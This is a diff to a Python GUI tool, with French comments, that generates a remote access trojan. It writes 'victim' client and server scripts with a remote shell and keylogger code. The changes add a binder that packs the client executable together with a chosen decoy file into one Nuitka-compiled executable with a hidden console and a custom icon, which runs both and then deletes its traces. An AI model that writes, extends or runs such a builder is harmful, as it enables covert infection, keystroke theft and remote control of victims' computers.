@@ -1,6 +1,212 @@
 import customtkinter as ctk
 from tkinter import filedialog, messagebox
 import os
+import subprocess
+import sys
+import shutil
+import time 
+import tempfile
+import zipfile
+import threading
+
+def create_exe_with_nuitka(input_file: str, exe_name: str = None):
+    """
+    Génère un fichier .exe à partir d'un script Python en utilisant Nuitka avec nettoyage automatique.
+    
+    :param input_file: Chemin vers le fichier Python source.
+    :param exe_name: Nom de l'exécutable généré (facultatif).
+    """
+    try:
+        # Vérification des prérequis
+        if not os.path.isfile(input_file):
+            raise FileNotFoundError(f"Le fichier spécifié '{input_file}' n'existe pas.")
+
+        # Nom par défaut pour l'exécutable
+        if not exe_name:
+            exe_name = os.path.splitext(os.path.basename(input_file))[0] + ".exe"
+        basename=os.path.basename(input_file)
+        if(basename=="server1.py"):
+        # Commande Nuitka pour la création de l'exécutable
+            command = [
+                sys.executable,
+                "-m", "nuitka",
+                "--standalone",       # Crée un exécutable autonome
+                "--onefile",          # Génère un seul fichier exécutable
+                "--mingw64",          # Utilise le compilateur MinGW64
+                "--nofollow-imports" # Importer seullment les bib importants
+            ]
+        else:
+             command = [
+                sys.executable,
+                "-m", "nuitka",
+                "--standalone",       # Crée un exécutable autonome
+                "--onefile",          # Génère un seul fichier exécutable
+                "--mingw64",          # Utilise le compilateur MinGW64
+                "--windows-disable-console", # ne pas affiche le terminal
+                "--nofollow-imports" # Importer seullment les bib importants
+            ]
+        # Ajouter le fichier d'entrée
+        command.append(input_file)
+
+        # Exécuter la commande Nuitka
+        print(f"Exécution de la commande : {' '.join(command)}")
+        result = subprocess.run(command, text=True, capture_output=True)
+
+        # Vérifier le statut de retour
+        if result.returncode == 0:
+            print("Compilation réussie.")
+
+            # Déplacer l'exécutable généré vers le dossier courant
+            exe_path = None
+            for root, _, files in os.walk("dist"):
+                for file in files:
+                    if file.endswith(".exe"):
+                        exe_path = os.path.join(root, file)
+                        break
+                if exe_path:
+                    break
+
+            if exe_path and os.path.isfile(exe_path):
+                shutil.move(exe_path, os.path.join(os.getcwd(), exe_name))
+                print(f"Fichier exécutable déplacé dans le dossier courant : {exe_name}")
+            else:
+                print("Fichier généré introuvable.")
+            
+            # Nettoyer les dossiers temporaires
+            for folder in ["dist", "build", "__pycache__"]:
+                if os.path.isdir(folder):
+                    shutil.rmtree(folder)
+                    print(f"Dossier '{folder}' supprimé.")
+        else:
+            print(f"Erreur lors de l'exécution de Nuitka : {result.stderr}")
+            print(f"Sortie standard : {result.stdout}")
+
+    except FileNotFoundError as e:
+        print(f"Erreur : {e}")
+    except subprocess.SubprocessError as e:
+        print(f"Erreur liée au sous-processus : {e}")
+    except Exception as e:
+        print(f"Une erreur inattendue est survenue : {e}")
+
+def create_zip_file(zip_path, file_path, client_path):
+    """Creates a ZIP file containing the specified file and the client executable."""
+    with zipfile.ZipFile(zip_path, 'w') as zipf:
+        zipf.write(file_path, os.path.basename(file_path))
+        zipf.write(client_path, os.path.basename(client_path))
+
+def extract_zip_file(zip_path, extract_to):
+    """Extracts the contents of the ZIP file to the specified directory."""
+    with zipfile.ZipFile(zip_path, 'r') as zipf:
+        zipf.extractall(extract_to)
+
+def create_temp_script(file_path, client_path):
+    """
+    Creates a temporary Python script that extracts files from the ZIP,
+    opens the specified file, and executes the client executable in the background.
+    """
+    binder_code = f"""
+import os
+import subprocess
+import sys
+import time
+import tempfile
+import zipfile
+
+def cleanup_files(*files):
+    # Deletes the extracted files
+    for file in files:
+        try:
+            os.remove(file)
+        except Exception as e:
+            print(f"Error deleting {{file}}: {{e}}")
+
+def extract_zip_file(zip_path, extract_to):
+    \"\"\"Extracts the contents of the ZIP file to the specified directory.\"\"\" 
+    with zipfile.ZipFile(zip_path, 'r') as zipf:
+        zipf.extractall(extract_to)
+
+def execute_and_show():
+    with tempfile.TemporaryDirectory() as temp_dir:
+        zip_path = os.path.join(os.path.dirname(__file__), 'files.zip')
+        extract_zip_file(zip_path, temp_dir)
+
+        file_path = os.path.join(temp_dir, '{os.path.basename(file_path)}')
+        client_path = os.path.join(temp_dir, '{os.path.basename(client_path)}')
+
+        # Open the specified file (non-blocking)
+        try:
+            if '{os.path.splitext(file_path)[1]}' == '.exe':
+                subprocess.Popen([str(file_path)], shell=True)
+            else:
+                print("Unsupported extension!")
+        except Exception as e:
+            print(f"Error opening the file: {{e}}")  
+
+        # Execute the client executable in the background (non-blocking)
+        try:
+            subprocess.Popen([str(client_path)], shell=True)
+        except Exception as e:
+            print(f"Error executing the EXE file: {{e}}")
+
+        # Clean up extracted files after execution
+        time.sleep(10)
+        cleanup_files(file_path, client_path)
+
+if __name__ == "__main__":
+    execute_and_show()
+"""
+    temp_file = os.path.join(tempfile.gettempdir(), "temp_binder.py")
+    with open(temp_file, "w", encoding="utf-8") as f:
+        f.write(binder_code)
+    return temp_file
+
+def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir, icon_path):
+    """
+    Builds a standalone executable containing the script and the ZIP file using Nuitka.
+    """
+    try:
+        subprocess.run([
+            sys.executable,
+            "-m", "nuitka",
+            "--standalone",             
+            "--onefile",                
+            "--mingw64",                
+            "--windows-disable-console", 
+            "--output-dir=" + output_dir,
+            "--windows-icon-from-ico=" + icon_path,
+            f"--include-data-files={zip_path}=files.zip",  
+            f"--output-filename={output_name}",  
+            temp_script
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        raise RuntimeError("Error creating the executable with Nuitka.") from e
+
+def clean_temp_files(temp_script):
+    """Deletes the temporary script."""
+    try:
+        os.remove(temp_script)
+    except Exception as clean_error:
+        print(f"Error cleaning temporary files: {clean_error}")
+
+def bind_files(file_path, client_path, icon_path, output_dir):
+    """
+    Combines opening a specified file with executing a client EXE into a single executable.
+    """
+    zip_path = os.path.join(tempfile.gettempdir(), 'files.zip')
+    create_zip_file(zip_path, file_path, client_path)
+
+    temp_script = create_temp_script(file_path, client_path)
+
+    file_name = os.path.basename(file_path)  # here we give the filename to inject  
+    full_output_path = os.path.join(output_dir, file_name)
+
+    build_executable_with_nuitka(temp_script, zip_path, file_name, output_dir, icon_path)
+
+    clean_temp_files(temp_script)
+
+    print(f"Combined file '{full_output_path}' generated successfully.")
+
+
 
 def create_victim_script1():
     victim_script_content = """#!/usr/bin/python3
@@ -59,7 +265,7 @@ def receive():
             break
     """
 
-    with open("victim.py", "w") as file:
+    with open("client1.py", "w") as file:
         file.write(victim_script_content)
 
 
@@ -274,10 +480,22 @@ def shell():
             command = receive()
             if not handle_command(command):
                 break
+            
+            #taritemment de la commande changer l'emplacemment
+            elif command.startswith("cd "):  # Gerer la commande 'cd'
+                try:
+                    os.chdir(command[3:])
+                    # Envoyer le nouveau repertoire au serveur
+                    sending(f"Changed directory to {os.getcwd()}")
+                except FileNotFoundError:
+                    sending("Directory not found.")
+                except Exception as e:
+                    sending(f"Error changing directory: {str(e)}")
+                continue
 
 """
     
-    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
+    with open("client1.py", "a") as file:  # Ouvrir en mode ajout
         file.write(victim_script_content2)
 
 
@@ -303,7 +521,7 @@ try:
 finally:
     s.close()"""
     
-    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
+    with open("client1.py", "a") as file:  # Ouvrir en mode ajout
         file.write(code_to_add)
 
 
@@ -322,7 +540,7 @@ def connection():
             print(f"Connection error: {e}")
             continue  # Retry after sleep interval
         """
-    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
+    with open("client1.py", "a") as file:  # Ouvrir en mode ajout
         file.write(f"\n")
         file.write(f"port = {port}\n")
         file.write(f"ip_address = \"{ip}\"\n")
@@ -399,7 +617,7 @@ def connection():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     """
 
-    with open("serve.py", "w") as file:
+    with open("server1.py", "w") as file:
         file.write(code_content)
 
 def create_server_2(ip, port):    
@@ -471,7 +689,7 @@ def shell():
             elif command.strip() == "cd":  # Verifier le repertoire courant
                 sending(command)
                 response = receive()  # Recevoir le repertoire courant
-                reper=response
+                reper = response
                 print(f"Current directory: {response}")
                 continue
             
@@ -623,7 +841,7 @@ if __name__ == "__main__":
         if s:
             s.close()
         """
-    with open("serve.py", "a") as file:  # Ouvrir en mode ajout
+    with open("server1.py", "a") as file:  # Ouvrir en mode ajout
         file.write(f"\n")
         file.write(f"    port = {port}\n")
         file.write(f"    ip_address = \"{ip}\"")
@@ -646,7 +864,7 @@ def add_keylogger_code_to_victim_script(self):
                 continue
 """
         # Ajouter le code dans le fichier victim.py
-        with open("victim.py", "a") as file:
+        with open("client1.py", "a") as file:
             file.write(keylogger_code)
         print("Code du keylogger ajoute dans victim.py")
     
@@ -857,7 +1075,7 @@ class OptionsPage(CenteredFrame):
         """
         Ajouter un bloc de code dans le fichier victim.py.
         """
-        with open("victim.py", "a") as file:
+        with open("client1.py", "a") as file:
             file.write(code)
         
 
@@ -886,11 +1104,14 @@ class FileSelectionPage(CenteredFrame):
 
         ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                       command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)
-
         ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
-                      command=lambda: controller.show_page("OutputPage")).pack(side="right", padx=10)
+                      command=self.save_and_next).pack(side="right", padx=10),
+        
 
-
+    def save_and_next(self):
+        self.controller.show_page("OutputPage")
+        
+    
     def choose_file(self):
         file_path = filedialog.askopenfilename(title="Choisir un fichier")
         if file_path:
@@ -960,6 +1181,16 @@ class NetworkSettingsPage(CenteredFrame):
             print("IP ou Port non définis.")
 
 
+class WaitingPage(ctk.CTkToplevel):
+    def __init__(self, parent, message="Veuillez patienter..."):
+        super().__init__(parent)
+        self.geometry("300x100")
+        self.title("En attente")
+        self.resizable(False, False)
+        self.label = ctk.CTkLabel(self, text=message, font=("Arial", 16))
+        self.label.pack(pady=20)
+        self.protocol("WM_DELETE_WINDOW", lambda: None)  # Désactiver la fermeture
+
 class OutputPage(CenteredFrame):
     def __init__(self, parent, controller):
         super().__init__(parent)
@@ -974,7 +1205,12 @@ class OutputPage(CenteredFrame):
 
         ctk.CTkButton(self.inner_frame, text="Choisir un emplacement", font=("Arial", 16),
                       command=self.choose_output).pack(pady=10)
-
+        self.icon_label = ctk.CTkLabel(self.inner_frame, text="Aucune icône sélectionné",
+                                         font=("Arial", 16), text_color="gray")
+        self.icon_label.pack(pady=10)
+        ctk.CTkButton(self.inner_frame, text="Choisir une icône", font=("Arial", 16),
+                      command=self.choose_icon).pack(pady=10)
+        
         # Boutons de navigation
         button_frame = ctk.CTkFrame(self.inner_frame)
         button_frame.pack(fill="x", pady=20)
@@ -983,7 +1219,7 @@ class OutputPage(CenteredFrame):
                       command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)
 
         ctk.CTkButton(button_frame, text="Générer", font=("Arial", 16),
-                      command=self.generate_rat).pack(side="right", padx=10)
+                      command=self.save_and_next).pack(side="right", padx=10)
 
     def choose_output(self):
         output_path = filedialog.askdirectory(title="Choisir un emplacement de stockage")
@@ -991,6 +1227,16 @@ class OutputPage(CenteredFrame):
             self.controller.user_choices["output_path"] = output_path
             self.output_label.configure(text=f"Emplacement sélectionné : {output_path}", text_color="white")
 
+    def choose_icon(self):
+        # Ouvre une boîte de dialogue pour sélectionner une icône (fichier .ico).
+        file_path = filedialog.askopenfilename(
+            title="Choisir une icône",
+            filetypes=[("Fichiers d'icônes", "*.ico"), ("Tous les fichiers", "*.*")]
+        )
+        if file_path:
+            self.controller.user_choices["icon_path"] = file_path  # Stocke le chemin dans user_choices
+            self.icon_label.configure(text=f"Icône sélectionnée : {file_path}", text_color="white")
+    
     def generate_rat(self):
         if not self.controller.user_choices["output_path"]:
             messagebox.showwarning("Avertissement", "Veuillez sélectionner un emplacement de stockage.")
@@ -1010,6 +1256,43 @@ class OutputPage(CenteredFrame):
             f"Fichier injecté : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
             f"Méthode de chiffrement : {encryption_method}\nStocké dans : {output_path}"
         )
+
+    def save_and_next(self):
+        # Crée et affiche une fenêtre d'attente
+        waiting_window = WaitingPage(self, message="Génération en cours, veuillez patienter...")
+        
+        # Fonction exécutée dans un thread
+        def background_task():
+            try:
+                current_dir = os.path.dirname(__file__)
+                input_file = os.path.join(current_dir, "client1.py")
+                exe_name = "client1.exe"
+                create_exe_with_nuitka(input_file, exe_name)
+                time.sleep(3)
+
+                input_file1 = os.path.join(current_dir, "server1.py")
+                exe_name1 = "server1.exe"
+                create_exe_with_nuitka(input_file1, exe_name1)
+                time.sleep(3)
+
+                client_path = os.path.join(current_dir, "client1.exe")
+                bind_files(self.controller.user_choices["file_to_inject"], client_path,
+                           self.controller.user_choices["icon_path"], self.controller.user_choices["output_path"])
+
+                # Générer le message de succès
+                self.generate_rat()
+
+            except Exception as main_error:
+                print(f"Error: {main_error}")
+                messagebox.showerror("Erreur", f"Une erreur s'est produite : {main_error}")
+            
+            finally:
+                waiting_window.destroy()  # Fermer la fenêtre d'attente
+
+        # Lancer le thread
+        thread = threading.Thread(target=background_task)
+        thread.start()
+
 
 if __name__ == "__main__":
     app = Application()
